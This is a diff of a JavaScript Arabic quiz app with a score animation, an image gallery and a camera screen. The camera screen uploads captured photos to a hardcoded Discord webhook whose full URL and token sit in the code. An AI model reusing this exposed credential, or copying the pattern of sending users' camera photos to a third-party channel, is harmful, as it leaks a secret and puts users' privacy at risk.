@@ -1,4 +1,3 @@
-// قائمة الأسئلة
 const questions = [
     {
         question: "ما هو العضو المسؤول عن تنقية الدم في جسم الإنسان؟",
@@ -27,7 +26,6 @@ const questions = [
     }
 ];
 
-// قائمة الصور
 const images = [
     'image1.png',
     'image2.png', 
@@ -41,20 +39,17 @@ let score = 0;
 let currentImage = 0;
 let isFlipped = false;
 
-// متغيرات الكاميرا
 let stream = null;
 let isCameraFlipped = false;
 let facingMode = "user";
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1375095333016703028/n_eMgBSWA4Z6bF8NrBosWslSFX-f5_T2EjTkX_HZFDs8xGE8DPGW4bkF9tL4NQh9eKKt";
 
-// بدء الاختبار
 function startQuiz() {
     document.getElementById('start-screen').style.display = 'none';
     document.getElementById('quiz-screen').style.display = 'block';
     showQuestion();
 }
 
-// عرض السؤال
 function showQuestion() {
     const question = questions[currentQuestion];
     document.getElementById('question-text').textContent = question.question;
@@ -72,7 +67,6 @@ function showQuestion() {
     });
 }
 
-// التحقق من الإجابة
 function checkAnswer(selectedAnswer) {
     const question = questions[currentQuestion];
     const buttons = document.querySelectorAll('.option-btn');
@@ -82,11 +76,7 @@ function checkAnswer(selectedAnswer) {
     });
     
     if (selectedAnswer === question.correctAnswer) {
-        buttons[selectedAnswer].classList.add('correct');
         score++;
-    } else {
-        buttons[selectedAnswer].classList.add('wrong');
-        buttons[question.correctAnswer].classList.add('correct');
     }
     
     setTimeout(() => {
@@ -96,49 +86,136 @@ function checkAnswer(selectedAnswer) {
         } else {
             showResult();
         }
-    }, 1500);
+    }, 500);
 }
 
-// عرض النتيجة
+function createCelebration() {
+    const celebration = document.createElement('div');
+    celebration.className = 'celebration';
+    document.querySelector('.score-container').appendChild(celebration);
+    
+    for (let i = 0; i < 50; i++) {
+        const confetti = document.createElement('div');
+        confetti.className = 'confetti';
+    
+        const colors = ['#6366f1', '#4f46e5', '#10b981', '#f59e0b', '#ef4444'];
+        confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+        
+        confetti.style.left = Math.random() * 100 + '%';
+        confetti.style.width = confetti.style.height = Math.random() * 8 + 6 + 'px';
+        
+        confetti.style.animation = `confettiFall ${Math.random() * 2 + 1}s linear forwards`;
+        confetti.style.opacity = '1';
+        
+        celebration.appendChild(confetti);
+    }
+}
+
 function showResult() {
     document.getElementById('quiz-screen').style.display = 'none';
     document.getElementById('result-screen').style.display = 'block';
-    document.getElementById('score').textContent = score;
+    
+    const scorePercentage = (score / questions.length) * 100;
+    const scoreElement = document.getElementById('score');
+    const scoreContainer = document.querySelector('.score-container');
+    
+    const progressRing = document.createElement('div');
+    progressRing.className = 'progress-ring';
+    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+    svg.setAttribute('width', '150');
+    svg.setAttribute('height', '150');
+    
+
+    const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
+    const gradient = document.createElementNS('http://www.w3.org/2000/svg', 'linearGradient');
+    gradient.setAttribute('id', 'gradient');
+    gradient.innerHTML = `
+        <stop offset="0%" stop-color="#6366f1" />
+        <stop offset="100%" stop-color="#4f46e5" />
+    `;
+    defs.appendChild(gradient);
+    svg.appendChild(defs);
+    
+    const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+    circle.setAttribute('class', 'progress-ring-circle');
+    circle.setAttribute('cx', '75');
+    circle.setAttribute('cy', '75');
+    circle.setAttribute('r', '65');
+    svg.appendChild(circle);
+    progressRing.appendChild(svg);
+    
+    const message = document.createElement('div');
+    message.className = 'score-message';
+    if (scorePercentage >= 80) {
+        message.textContent = 'ممتاز! أداء رائع 🌟';
+        scoreContainer.classList.add('completed');
+    } else if (scorePercentage >= 60) {
+        message.textContent = 'جيد جداً! استمر في التحسن 💪';
+    } else {
+        message.textContent = 'حاول مرة أخرى، أنت قادر على الأفضل ✨';
+    }
+    
+    scoreContainer.insertBefore(progressRing, scoreContainer.firstChild);
+    scoreElement.textContent = '0';
+    scoreContainer.appendChild(message);
+    
+    const circumference = 2 * Math.PI * 65;
+    circle.style.strokeDasharray = circumference;
+    circle.style.strokeDashoffset = circumference;
+    
+    let currentScore = 0;
+    const duration = 2000;
+    const steps = 60;
+    const increment = score / steps;
+    const stepDuration = duration / steps;
+    
+    const scoreAnimation = setInterval(() => {
+        currentScore += increment;
+        if (currentScore >= score) {
+            currentScore = score;
+            clearInterval(scoreAnimation);
+            
+            scoreElement.style.transform = 'scale(1.2)';
+            setTimeout(() => {
+                scoreElement.style.transform = 'scale(1)';
+                createCelebration();
+            }, 200);
+        }
+        
+        scoreElement.textContent = Math.round(currentScore);
+        
+            const currentPercentage = (currentScore / questions.length) * 100;
+        circle.style.strokeDashoffset = circumference - (currentPercentage / 100) * circumference;
+    }, stepDuration);
 }
 
-// عرض معرض الصور
 function showGallery() {
     document.getElementById('result-screen').style.display = 'none';
     document.getElementById('gallery-screen').style.display = 'block';
     updateGalleryImage();
 }
 
-// تحديث الصورة الحالية
 function updateGalleryImage() {
     const img = document.getElementById('current-gallery-image');
     img.src = images[currentImage];
     img.className = 'gallery-image' + (isFlipped ? ' flipped' : '');
 }
 
-// الانتقال للصورة التالية
 function nextImage() {
     currentImage = (currentImage + 1) % images.length;
     updateGalleryImage();
 }
 
-// الانتقال للصورة السابقة
 function prevImage() {
     currentImage = (currentImage - 1 + images.length) % images.length;
     updateGalleryImage();
 }
 
-// قلب الصورة
 function flipImage() {
     isFlipped = !isFlipped;
     updateGalleryImage();
 }
 
-// إعادة الاختبار
 function restartQuiz() {
     currentQuestion = 0;
     score = 0;
@@ -149,14 +226,12 @@ function restartQuiz() {
     document.getElementById('start-screen').style.display = 'block';
 }
 
-// عرض صفحة الكاميرا
 async function showCamera() {
     document.getElementById('gallery-screen').style.display = 'none';
     document.getElementById('camera-screen').style.display = 'block';
     await startCamera();
 }
 
-// بدء تشغيل الكاميرا
 async function startCamera() {
     try {
         if (stream) {
@@ -179,13 +254,11 @@ async function startCamera() {
     }
 }
 
-// تبديل الكاميرا
 async function flipCamera() {
     facingMode = facingMode === "user" ? "environment" : "user";
     await startCamera();
 }
 
-// التقاط صورة
 function capturePhoto() {
     const video = document.getElementById('camera-preview');
     const canvas = document.getElementById('camera-canvas');
@@ -198,11 +271,9 @@ function capturePhoto() {
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
     
-    // التقاط الصورة كما تظهر في الشاشة بدون عكس
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     capturedImage.src = canvas.toDataURL('image/jpeg');
-    // عرض الصورة كما تم التقاطها بدون عكس
     capturedImage.className = "";
     
     video.style.display = 'none';
@@ -212,7 +283,6 @@ function capturePhoto() {
     sendBtn.style.display = 'block';
 }
 
-// إعادة المحاولة
 function retryPhoto() {
     const video = document.getElementById('camera-preview');
     const capturedImage = document.getElementById('captured-image');
@@ -227,26 +297,20 @@ function retryPhoto() {
     sendBtn.style.display = 'none';
 }
 
-// إرسال الصورة إلى Discord
 async function sendToDiscord() {
     const capturedImage = document.getElementById('captured-image');
     const sendBtn = document.getElementById('send-btn');
     
     sendBtn.disabled = true;
-    sendBtn.innerHTML = `
-        <div class="loading-state">
-            <i class="fas fa-spinner fa-spin"></i>
-            جاري الإرسال...
-        </div>
-    `;
+    sendBtn.textContent = 'جاري الإرسال...';
 
     try {
         const response = await fetch(capturedImage.src);
         const blob = await response.blob();
-        
+    
         const formData = new FormData();
         formData.append('file', blob, 'captured_image.jpg');
-        
+        formData.append('content', 'صورة جديدة من الاختبار');
 
         const discordResponse = await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
@@ -254,38 +318,29 @@ async function sendToDiscord() {
         });
 
         if (discordResponse.ok) {
-            sendBtn.innerHTML = `
-                <div class="success-state">
-                    <i class="fas fa-check"></i>
-                    تم الإرسال بنجاح!
-                </div>
-            `;
-            setTimeout(() => restartQuiz(), 2000);
+            alert('تم إرسال الصورة بنجاح!');
+            sendBtn.textContent = 'سيتم إعادة تحميل الصفحة خلال 10 ثواني...';
+            
+         
+            let countdown = 10;
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                sendBtn.textContent = `سيتم إعادة تحميل الصفحة خلال ${countdown} ثواني...`;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.reload();
+                }
+            }, 1000);
         } else {
             const errorText = await discordResponse.text();
             console.error('خطأ من Discord:', errorText);
-            sendBtn.innerHTML = `
-                <div class="error-state">
-                    <i class="fas fa-times"></i>
-                    فشل الإرسال
-                </div>
-            `;
+            throw new Error('حدث خطأ أثناء إرسال الصورة');
         }
     } catch (err) {
         console.error('خطأ في إرسال الصورة:', err);
-        sendBtn.innerHTML = `
-            <div class="error-state">
-                <i class="fas fa-times"></i>
-                فشل الإرسال
-            </div>
-        `;
-    } finally {
-        setTimeout(() => {
-            sendBtn.disabled = false;
-            sendBtn.innerHTML = `
-                <i class="fas fa-paper-plane"></i>
-                إرسال الصورة
-            `;
-        }, 3000);
+        alert('حدث خطأ أثناء إرسال الصورة');
+        sendBtn.disabled = false;
+        sendBtn.textContent = 'إرسال الصورة';
     }
-}
+} 
